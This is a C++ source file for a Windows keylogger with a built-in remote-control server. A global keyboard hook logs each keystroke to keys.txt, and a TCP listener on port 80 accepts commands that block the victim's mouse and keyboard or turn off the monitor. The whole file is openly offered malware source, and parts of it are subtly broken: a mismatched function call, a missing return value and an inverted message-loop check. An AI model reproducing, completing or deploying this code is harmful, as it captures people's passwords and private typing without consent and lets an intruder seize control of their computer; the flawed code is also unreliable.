#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <fstream>
#include <iostream>
#include <winsock2.h>
#include <string>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")

using namespace std;

ofstream out("keys.txt", ios::out);
#define DESTPORT 80


// Shay Deganey 2015.
// Most describes is from Msdn modifited by me.

/*
SendMessage - Sends the specified message to a window or windows. it calls the windows procedure for the specified window
--------------------------------------------------------------------------------------------------------------------------
				hWnd[HWND] - A handle to the window whose window procedure will receive the message.
				if this parameter is 'HWND_BROADCAST'(0xFFFF), The message is sent to all top-level windows in the system.

				Msg[UINT] - The Message to be sent. // list of messages : https://msdn.microsoft.com/en-us/library/windows/desktop/ms644927(v=vs.85).aspx

				wParam[WPARAM] - Additional message-specific information.

				lParam[LPARAM] - Additional message-specific information.

						Return value : Depends on message that has been sent.


*/


void block() {
	BlockInput(true);
	Sleep(6000);
	BlockInput(false);
}

int turnOffMonitor(int Time) {
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
	Sleep(Time * 1000);
	return 1;
}

bool BlockDevices() {
	bool bInp;
	bInp = BlockInput(true);
	// Send to target that Devices has been locked.
	if (bInp == 0)
		return false; // Already blocked.

	return true; // Being locked atm.

}

void unBlockDevices() {
	BlockInput(false);
}

class Server {
public:
	int err;
	int dataLength;
	int Result;
	char buff[1000];

	SOCKADDR_IN serverinfo;
	SOCKET connSocket,Temp;


	bool Start();
	int  bindServer();
	void listenOn();
	void acceptConnection();
	void getCommands();
	int  receiveMessage(SOCKET socket, char* buffer, int bufferSize);
};

int  Server::receiveMessage(SOCKET socket, char* buffer, int bufferSize) {
	return recv(socket, buffer, bufferSize, 0);
}
int  Server::bindServer() {

	if (bind(connSocket, (SOCKADDR*)&serverinfo, sizeof(serverinfo)) == SOCKET_ERROR) {
		std::cout << "[-] Unable to bind socket!";
		WSACleanup();
		return 0;
	}
}
void Server::listenOn() {
	listen(connSocket, 5);
}
bool Server::Start() {
	WSADATA wsaData;
	err = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (err != 0) {
		cout << "WSAStartup failed." << endl; // [*] can be deleted.
		return false;
	}

	connSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	serverinfo.sin_family = AF_INET;
	serverinfo.sin_addr.s_addr = INADDR_ANY;
	serverinfo.sin_port = htons(DESTPORT);

	return true;
}
void Server::acceptConnection() {
	Temp = SOCKET_ERROR;
	while (Temp == SOCKET_ERROR){
		Temp = accept(connSocket, NULL, NULL);
	}
	connSocket = Temp;
}
void Server::getCommands() {
	
	memset(buff, 0, 999);
	dataLength = 0;
	Result = WSAGetLastError();

	while (Result == 0) {
		dataLength = recv(connSocket, buff, sizeof(buff), 0);
		if (strcmp(buff, "close") == 0)
			exit(1);
		else if (strcmp(buff, "Disable") == 0)
			block();
		else if (strcmp(buff, "Monitor") == 0)
			TurnOffMonitor();

		ZeroMemory(buff, 1000);
		Result = WSAGetLastError();

	}

}

void Network() {
	Server SessionOne;
	SessionOne.Start();
	SessionOne.bindServer();
	SessionOne.listenOn();
	SessionOne.acceptConnection();
	SessionOne.getCommands();

}

bool isCapsLockOn() {
	/*
	GetKeyState - Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled
	-------------------------------------------------------------------------------------------------------------------

				Return value :If the high-order bit is 1, the key is down; otherwise, it is up.
							  If the low-order bit is 1, the key is toggled. A key, such as the CAPS LOCK key, is toggled if it is turned on.

	*/
	if ((GetKeyState(VK_CAPITAL) & 0x00001) != 0) // checking the most significant bit.
		return true;
	else
		return false;

}

/*
		Callback LowLevelKeyBoardProc function :
		-----------------------------------------------------------------------

				Call this function when ever keyboard process event is happend.

		Parameters :
				nCode : A code the hook uses to determine how to process the message.
						if nCode < 0 The hook must pass the message to the CallNextHookEx without
						further processing and should erurn the value returned by CallNextHookEx

				wParam : The identifiter of the keyboard message. This parameter can be :
						WM_KEYDOWN
						VM_KEYUP
						VM_SYSKEYDOWN
						VM_SYSKEYUP

				lParam : a Pointer to a KBDLLHOOKSTRUCT structure.

				Return Value :
						Type : LResult.

						if nCode < 0 See above.
						if nCode >= 0

*/
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

	// notification to tomorrow : Kick Switch of p->vkCode , And use if's
	if (wParam == WM_KEYDOWN) {

		if (p->vkCode >= 0x30 && p->vkCode <= 0x39) // 0~9
		{
			switch (p->vkCode) {
				// 0 ~ 9 with Shift Options.
			case 0x30: if (GetAsyncKeyState(VK_SHIFT)) out << ')';		else out << '0';		 break;
			case 0x31: if (GetAsyncKeyState(VK_SHIFT)) out << '!';		else out << '1';		 break;
			case 0x32: if (GetAsyncKeyState(VK_SHIFT)) out << '@';		else out << '2';		 break;
			case 0x33: if (GetAsyncKeyState(VK_SHIFT)) out << '#';		else out << '3';		 break;
			case 0x34: if (GetAsyncKeyState(VK_SHIFT)) out << '$';		else out << '4';		 break;
			case 0x35: if (GetAsyncKeyState(VK_SHIFT)) out << '%';		else out << '5';		 break;
			case 0x36: if (GetAsyncKeyState(VK_SHIFT)) out << '^';		else out << '6';		 break;
			case 0x37: if (GetAsyncKeyState(VK_SHIFT)) out << '&';		else out << '7';		 break;
			case 0x38: if (GetAsyncKeyState(VK_SHIFT)) out << '*';		else out << '8';		 break;
			case 0x39: if (GetAsyncKeyState(VK_SHIFT)) out << '(';		else out << '9';		 break;
			}
		}
		else if (p->vkCode >= 0x41 && p->vkCode <= 0x5A) // a~z
		{
			/*
			Shift   Caps    LowerCase = !(Shift ^ Caps)   UpperCase = Shift ^ Caps.
			1       1			 1								0
			1       0			 0								1
			0       1			 0								1
			0       0			 1								0
			*/

			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLockOn()))
				out << char(tolower(p->vkCode));
			else
				out << (char)p->vkCode;
		}
		else if (p->vkCode >= 0x70 && p->vkCode <= 0x7B) // F1 ~ F12.
		{
			out << "[F" << p->vkCode - 111 << "]";
		}
		else
		{
			switch (p->vkCode)
			{
			case VK_CAPITAL:	out << "<CAPLOCK>";		break;
			case VK_LCONTROL:	out << "<LCTRL>";		break;
			case VK_RCONTROL:	out << "<RCTRL>";		break;
			case VK_INSERT:		out << "<INSERT>";		break;
			case VK_END:		out << "<END>";			break;
			case VK_PRINT:		out << "<PRINT>";		break;
			case VK_DELETE:		out << "<DEL>";			break; // Reminder ** Make it actually delete, (fseek).
			case VK_BACK:		out << "<BK>";			break;
			case VK_LEFT:		out << "<LEFT>";		break;
			case VK_RIGHT:		out << "<RIGHT>";		break;
			case VK_UP:			out << "<UP>";			break;
			case VK_DOWN:		out << "<DOWN>";		break;
			case VK_SPACE:		out << ' ';				break;
			case VK_ESCAPE:		out << "<ESC>";			break;
			case VK_TAB:		out << "<TAB>";			break;

			}
		}

	}

	/*
	Passes the hook information to the next hook procedure in the current chain.
	*/

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int  main() {
	HANDLE myHandler;
	DWORD myThreadID;


	/*
		HANDLE WINAPI CreateThread function:
		----------------------------------------------------------------------
			This function creates a thread to execute within the virtual address space of the calling process.
			

			lpThreadAttributes[LPSECURITY_ATTRIBUTES] (_In_opt) - a pointer to strucute that determines whether the returned handle
					can be inherited by child proccess. if its NULL, the handle cannot be inherited.

			dwStackSize[SIZE_T] (_in_) - the initial size of the stack, in bytes. if this value is zero,
					the new thread uses the default size of executeable.
			lpStartAddress(LPTHREAD_START_ROUTINE] (_In_) - A pointer to the function to be executed by the thread.
			lpParameter[LPVOID] (_In_opt) - A pointer to a variable tobe passed to the thread.
			dwCreationFlag[DWORD] (_In_) - The flag that control the thread creation. // Created Suspended, doesnpt run untill ResumeThread is called.
			lpThreadld[LPWORD} (_Out_opt) - a pointer to a variable that recievs the thread identifiter.
	*/
	myHandler = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Network, 0, 0, &myThreadID);

	/*
		HHOOK WINAPI SetWindowsHookEx function :
		-----------------------------------------------------------------------
			Installs an Application-defined hook procedure into a hook chain.
			You would install a hook procedure to monitor the system for certain type of events.
			These events are associated either with a specific thread or with all threads in the same desktop as the calling thread.

					idHook[int] - The type of hook procedure to be installed. The parameters are listed in msdn site,
					We're hooking LowLevelKeyBoardProc That why we use this parameter as : WH_KEYBOARD_LL (13).

					lpfn[HOOKPROC] - A Pointer to the hook procedure.

					hMod[hIstance] - A handle to the Dll containing the hook procedure.

					dwThreadld[dWord] - the identifier of th thread which the hook procedure is to be associated. for desktop app this parameter zero.

	*/
	HHOOK keyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	MSG msg;


	// While you get a message (Event occured)
	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		// Translate - process that information.
		TranslateMessage(&msg);
		// Dispatch - Send it to the proper function to handle.
		DispatchMessage(&msg);
	}


	UnhookWindowsHookEx(keyBoard);

}